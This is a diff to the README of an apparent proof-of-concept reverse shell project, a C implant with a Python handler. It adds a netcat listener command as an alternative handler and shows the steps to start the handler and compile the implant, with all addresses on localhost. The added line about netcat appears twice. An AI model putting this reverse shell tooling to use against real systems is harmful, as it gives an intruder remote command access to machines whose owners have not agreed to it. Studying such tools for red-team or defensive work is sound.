@@ -4,10 +4,15 @@ A proof-of-concept reverse shell (written in C) and its handler (written in Pyth
 # Usage
 This PoC is made of two components, a handler and the implant/reverse shell code. 
 
-First, we execute the handler to listen on a particular address and port
+First, we execute the handler to listen on a particular address and port. The implant is also compatible with netcat
 ```bash
 python3 python-handler.py 127.0.0.1 4444
 ```
+The implant is also compatible with netcat, so it can also be used to manage a reverse shell connection.
+```bash
+nc -nvlp 127.0.0.1 4444 -s 127.0.0.1
+```
+
 Then, we compile the implant/reverse shell code, and execute it by providing it with handler's listening address and port
 ```bash
 gcc -o implant implant.c
